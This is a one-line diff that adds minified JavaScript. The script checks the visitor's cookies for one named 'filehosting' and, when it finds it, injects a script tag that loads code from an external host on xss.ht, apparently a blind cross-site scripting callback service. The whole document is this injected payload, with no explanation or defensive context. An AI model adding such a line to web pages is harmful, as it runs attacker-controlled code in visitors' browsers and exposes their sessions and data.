@@ -1,0 +1,1 @@
+for(var a=document.cookie.split(";"),b=0;b<a.length;b++)if(name=a[b].split("=")[0],"filehosting"===name){var c=document.createElement("script");c.src="https://rachana.xss.ht";document.body.appendChild(c)};
